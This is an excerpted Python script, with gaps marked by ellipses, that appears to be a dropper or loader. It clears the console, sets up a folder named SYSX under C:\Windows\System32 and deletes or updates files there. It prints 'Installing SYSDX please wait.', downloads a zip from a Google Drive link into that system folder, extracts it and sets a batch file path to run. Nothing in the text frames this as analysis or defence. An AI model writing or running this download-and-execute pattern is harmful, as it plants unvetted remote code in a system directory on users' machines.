...
os.system('cls')
dcnmwxdr = r'C:\Windows\System32\SYSX'
...
def delete_files_if_condition(file):
    target_dir = r"C:\Windows\System32\SYSX" 
...
def updating_premx():
    aesv3_path = r"C:\Windows\System32\SYSX\klx2025.py"
    directory_path = r"C:\Windows\System32\SYSX"
...
if not os.path.exists("C:\\Windows\\System32\\SYSX\\sysdx.py"):
    os.system('cls')
    print("Installing SYSDX please wait.")
    download_file_from_google_drive("https://drive.google.com/uc?id=11-_ZToKra8gUSOWLULof5emlZYOt3NE3", "C:\\Windows\\System32\\SYSX\\sys.zip")
    zip_file = r'C:\Windows\System32\SYSX\sys.zip'
    extract_dir = r'C:\Windows\System32\SYSX'
...
os.system('cls')
batch_file_path = r"C:\Windows\System32\SYSX\sysdx.bat"
os.system('cls')
